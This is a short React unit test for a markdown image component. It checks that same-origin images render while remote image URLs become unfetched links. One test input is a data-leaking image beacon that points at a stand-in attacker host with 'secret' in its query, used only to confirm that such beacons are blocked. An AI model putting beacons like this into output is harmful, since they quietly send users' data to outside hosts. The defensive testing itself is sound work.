import assert from "node:assert/strict";
import test from "node:test";

import { installDom, renderReact } from "../../test/react-test-utils";

import { MarkdownImage } from "./markdown-content";

// The full MarkdownContent does not render under jsdom, so the image override is tested on its own.
test("same-origin images load, remote images become links that are not fetched", async () => {
  const restore = installDom("https://carapace.example.test/");
  try {
    const view = await renderReact(
      <>
        <MarkdownImage src="/files/chart.png" alt="chart" />
        <MarkdownImage src="https://evil.example/?q=secret" alt="beacon" />
      </>,
    );

    const images = Array.from(view.container.querySelectorAll("img")).map((img) => img.getAttribute("src"));
    assert.deepEqual(images, ["/files/chart.png"]);
    const link = view.container.querySelector('a[href="https://evil.example/?q=secret"]');
    assert.equal(link?.textContent, "https://evil.example/?q=secret");
    await view.unmount();
  } finally {
    restore();
  }
});
